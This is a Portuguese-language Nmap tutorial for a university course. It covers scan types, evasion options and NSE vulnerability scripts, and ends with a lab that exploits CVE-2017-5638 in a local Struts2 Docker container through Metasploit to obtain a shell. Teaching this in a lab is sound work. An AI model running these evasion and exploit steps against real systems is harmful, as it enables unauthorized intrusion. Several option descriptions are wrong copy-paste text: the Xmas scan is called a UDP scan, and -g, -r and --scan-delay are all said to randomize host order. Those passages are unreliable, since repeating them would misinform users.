# Guia Avançado do Nmap

Este é um guia prático* para mostrar como usar os principais comandos do Nmap para fins de varredura de rede e auditoria de segurançan, incluindo um exemplo prático de como usá-lo para identificar e explorar uma vulnerabilidade específica em uma aplicação rodando em um contêiner Docker. Usaremos um exemplo de CVE (Common Vulnerabilities and Exposures) e mostraremos o processo completo de escaneamento, identificação e exploração.

\* Guia escrito para a disciplina de Sistemas Distribuídos do Mestrado em Ciência da Computação do PPGCC - UFCG 

---

## Introdução

### O que é o Nmap?
Nmap (Network Mapper) é uma ferramenta de código aberto usada para varredura de rede e auditoria de segurança. Ela é extremamente versátil, permitindo descobrir hosts e serviços em uma rede, além de identificar vulnerabilidades.

### Por que usar o NMAP?

Existem várias razões pelas quais o Nmap é uma escolha popular entre os profissionais de segurança e administradores de sistemas:

- **Descoberta de Dispositivos**: O Nmap permite descobrir todos os dispositivos ativos em uma rede, incluindo computadores, servidores, roteadores, impressoras e outros dispositivos conectados.
- **Mapeamento de Serviços e Portas**: Com o Nmap, é possível identificar quais serviços estão em execução em cada dispositivo e em quais portas eles estão escutando. Isso ajuda a entender melhor a configuração e segurança da rede.
- **Detecção de Vulnerabilidades**: O Nmap pode detectar vulnerabilidades em serviços e sistemas operacionais, ajudando os profissionais de segurança a identificar e corrigir falhas de segurança antes que sejam exploradas por invasores.
- **Auditoria de Segurança**: Ao fornecer uma visão detalhada da rede e de seus serviços, o Nmap facilita a realização de auditorias de segurança para garantir que as melhores práticas de segurança estejam sendo seguidas e que não haja falhas de segurança.

### Instalação
O Nmap está disponível para a maioria dos sistemas operacionais, incluindo Linux, Windows e macOS.

#### Linux
```bash
sudo apt-get install nmap
```

#### Windows
Baixe o instalador do [site oficial do Nmap](https://nmap.org/download.html) e siga as instruções.

#### macOS
```bash
brew install nmap
```

---

## Conceitos Básicos

### Comandos Simples
O comando mais básico do Nmap é utilizado para escanear um único host:
```bash
nmap <endereço IP ou hostname>
```

### Scans de Portas
Para escanear portas específicas, use a opção `-p`:
```bash
nmap -p 80,443 <endereço IP>
```
Para escanear um intervalo de portas:
```bash
nmap -p 1-1000 <endereço IP>
```

---

## Técnicas de Scans Avançados

O Nmap oferece uma variedade de métodos de varredura para descobrir hosts, portas e serviços. Cada tipo de scan tem suas próprias características e é adequado para diferentes cenários. Abaixo estão alguns dos principais tipos de varreduras disponíveis no Nmap:

### Tipos de Scans
- **TCP Connect Scan (`-sT`)**: Estabelece uma conexão completa TCP. É o tipo de scan padrão se o usuário estiver executando o Nmap sem privilégios de root.
```bash
nmap -sT <endereço_IP>
```
- **SYN Scan (`-sS`)**: Conhecido como "half-open scan", abre uma conexão TCP não completamente enviando um pacote SYN e aguardando a resposta SYN/ACK.
```bash
nmap -sS <endereço_IP>
```
- **UDP Scan (`-sU`)**: Escaneia portas UDP enviando pacotes UDP a cada porta alvo. Pode ser mais lento que o scan TCP.
```bash
nmap -sU <endereço IP>
```
- **Xmas Scan (`-sX`)**: Escaneia portas UDP enviando pacotes UDP a cada porta alvo. Pode ser mais lento que o scan TCP.
```bash
nmap -sX <endereço IP>
```
- **Null Scan (`-sN`)**: Envia pacotes sem flags definidos. Pode ser útil para detectar portas abertas e fechadas em sistemas que não seguem estritamente a RFC 793.
```bash
nmap -sN <endereço IP>
```
- **FIN Scan (`-sF`)**: Envia pacotes com o flag FIN definido. Utilizado para bypassar alguns firewalls e sistemas de detecção de intrusão.
```bash
nmap -sF <endereço IP>
```
- **ACK Scan (`-sA`)**: Envia pacotes com o flag ACK definido. Útil para mapear regras de firewall e determinar se portas estão filtradas.
```bash
nmap -sA <endereço IP>
```
- **IP Protocol Scan (`-sO`)**: Determina quais protocolos IP (ICMP, TCP, UDP, etc.) são suportados pelo host alvo.
```bash
nmap -sO <endereço IP>
```
- **List Scan (`-sL`)**: Lista os hosts e nomes de DNS sem enviar pacotes aos hosts alvo. Útil para verificar o escopo de uma varredura.
```bash
nmap -sL <endereço IP>
```
- **Ping Scan (`-sn`)**: Determina quais hosts estão ativos na rede sem realizar uma varredura de portas.
```bash
nmap -sn <endereço IP>
```


### Técnicas de Evasão
O Nmap oferece diversas técnicas de evasão que podem ser usadas para dificultar a detecção de varreduras de rede por firewalls, sistemas de detecção de intrusão (IDS) e outros mecanismos de segurança.
- **Fragmentação de Pacotes (`-f`)**: Divide os pacotes em fragmentos menores.
```bash
nmap -f <endereço IP>
```
- **Decoy (`-D`)**: Usa IPs falsos para disfarçar a origem do scan.
```bash
nmap -D RND:10 <endereço IP>
```
- **Randomização de Ordem de Host (`-r`)**: Randomiza a ordem dos hosts durante o scan.
```bash
nmap -r <endereço IP>
```
- **Uso de Portas Não Padrão (`-g`)**: Randomiza a ordem dos hosts durante o scan.
```bash
nmap -g <endereço IP>
```
- **Varredura em Baixa Velocidade (`--scan-delay`)**: Randomiza a ordem dos hosts durante o scan.
```bash
nmap --scan-delay 5s <endereço IP>
```

---
### Salvando Resultados de Varredura
#### Salvar em XML
Os resultados da varredura podem ser salvos em um arquivo XML para análise posterior ou para uso com outras ferramentas.

Como salvar:
```bash
nmap -oX resultados.xml <endereço_IP>
```
Exemplo:
```bash
nmap -sV -oX scan_resultados.xml 192.168.1.1
```

#### Salvar em Formato Normal
Os resultados da varredura podem ser salvos em um arquivo de texto normal:
```bash
nmap -oN resultados.txt <endereço_IP>
```

#### Salvar em Formato de Scripts Nmap
Para salvar em um formato que possa ser lido novamente pelo Nmap:
```bash
nmap -oA resultados <endereço_IP>
```
Esse comando gera três arquivos: resultados.nmap (texto normal), resultados.xml (XML) e resultados.gnmap (formato Grepable Nmap).

---
## Scripts NSE (Nmap Scripting Engine)

### Introdução ao NSE
O NSE permite que os usuários executem scripts para tarefas específicas, como detecção de vulnerabilidades ou coleta de informações adicionais.

### Scripts Comuns
Para listar scripts disponíveis:
```bash
nmap --script-help
```

Executar um script específico:
```bash
nmap --script <nome_do_script> <endereço IP>
```
Exemplo de uso do script de detecção de vulnerabilidades HTTP:
```bash
nmap --script http-vuln* <endereço IP>
```

---

## Scans de Vulnerabilidades

### Identificação de Vulnerabilidades
O Nmap pode ser usado para identificar vulnerabilidades comuns através de seus scripts NSE.

Exemplo de scan de vulnerabilidades SMB:
```bash
nmap --script smb-vuln* <endereço IP>
```

### Exemplos Práticos
Detectar vulnerabilidades SSL:
```bash
nmap --script ssl-enum-ciphers <endereço IP>
```

---

## Ferramentas Complementares

### Zenmap
Zenmap é a interface gráfica do Nmap, facilitando o uso e visualização de resultados.

### Ndiff
Ndiff é uma ferramenta para comparar os resultados de scans do Nmap.

```bash
ndiff scan_resultados1.xml scan_resultados2.xml
```

---

## Guia Prático: Explorando uma Vulnerabilidade CVE em Docker

### Preparação do Ambiente

1. **Instalar Docker**: Se você ainda não tem Docker instalado, siga as instruções no [site oficial do Docker](https://docs.docker.com/get-docker/).

2. **Baixar e Executar a Aplicação Vulnerável**:
   Vamos usar uma aplicação web vulnerável para este exemplo. A aplicação escolhida é uma versão vulnerável do Apache Struts2, uma estrutura de desenvolvimento web Java. Vamos assumir que a vulnerabilidade é a CVE-2017-5638 (Apache Struts2 Remote Code Execution).

   ```bash
   docker run -d -p 8080:8080 vulhub/struts2:2.3.30
   ```
   Este comando faz o download da imagem docker e executa o container da versão 2.3.30 do Apache Struts2, que é conhecida por possuir a vulnerabilidade CVE-2017-5638.

### Escaneamento com Nmap

1. **Identificar a Aplicação e suas Portas**:
   ```bash
   nmap -p 8080 --script http-vuln-cve2017-5638 localhost
   ```

   O script `http-vuln-cve2017-5638` vai verificar especificamente a vulnerabilidade CVE-2017-5638.

2. **Analisar o Resultado**:
   Se a vulnerabilidade for detectada, você verá uma mensagem indicando que a aplicação está vulnerável a CVE-2017-5638.

### Exploração da Vulnerabilidade

1. **Obter uma Ferramenta de Exploração**:
   Existem várias ferramentas que podem explorar a CVE-2017-5638. Uma delas é a ferramenta disponível no Metasploit Framework.

2. **Iniciar o Metasploit Framework**:
   ```bash
   msfconsole
   ```

3. **Configurar e Executar o Exploit**:
   No console do Metasploit, execute os seguintes comandos:
   ```bash
   use exploit/multi/http/struts2_content_type_ognl
   set RHOST localhost
   set RPORT 8080
   run
   ```

   Se a exploração for bem-sucedida, você obterá uma sessão de shell na aplicação vulnerável.

---

## Boas Práticas
- **Autorização**: Sempre obtenha permissão antes de escanear uma rede ou sistema.
- **Desempenho**: Use opções de controle de desempenho (`-T4`, `-T5`) com cuidado para não sobrecarregar a rede.
- **Atualizações**: Mantenha o Nmap e seus scripts NSE atualizados.

---

## Referências
- [Site Oficial do Nmap](https://nmap.org/)
- [Guia do Nmap](https://nmap.org/book/)
- [Cheat Sheet do Nmap](https://nmap.org/cheatsheet.html)
- [Base de Dados CVE](https://cve.mitre.org/)
- [Docker Hub](https://hub.docker.com/)
- [NIST](https://nvd.nist.gov/vuln/detail/cve-2017-5638)

---